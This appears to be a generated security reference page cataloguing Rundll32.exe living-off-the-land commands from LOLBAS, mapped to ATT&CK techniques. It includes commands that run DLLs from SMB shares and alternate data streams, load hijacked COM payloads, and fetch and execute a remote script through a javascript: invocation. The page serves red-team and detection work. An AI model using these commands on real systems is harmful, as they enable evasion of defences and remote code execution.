---
parsed_by: focuslocust
source: commands
type: generated
---
# Rundll32 Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Rundll32.exe

Tool page: [Rundll32.exe](../../tools/windows/rundll32.exe.md)

### Execute DLL file

```text
rundll32.exe {PATH},EntryPoint
```

Description:

First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute.

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rundll32.yml` |
| Evidence | Command preserved from source parser. |

### Execute DLL from SMB share.

```text
rundll32.exe {PATH_SMB:.dll},EntryPoint
```

Description:

Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rundll32.yml` |
| Evidence | Command preserved from source parser. |

### Execute code from Internet

```text
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
```

Description:

Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rundll32.yml` |
| Evidence | Command preserved from source parser. |

### Execute code from alternate data stream

```text
rundll32 "{PATH}:ADSDLL.dll",DllMain
```

Description:

Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rundll32.yml` |
| Evidence | Command preserved from source parser. |

### Execute a DLL/EXE COM server payload or ScriptletURL code.

```text
rundll32.exe -sta {CLSID}
```

Description:

Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rundll32.yml` |
| Evidence | Command preserved from source parser. |
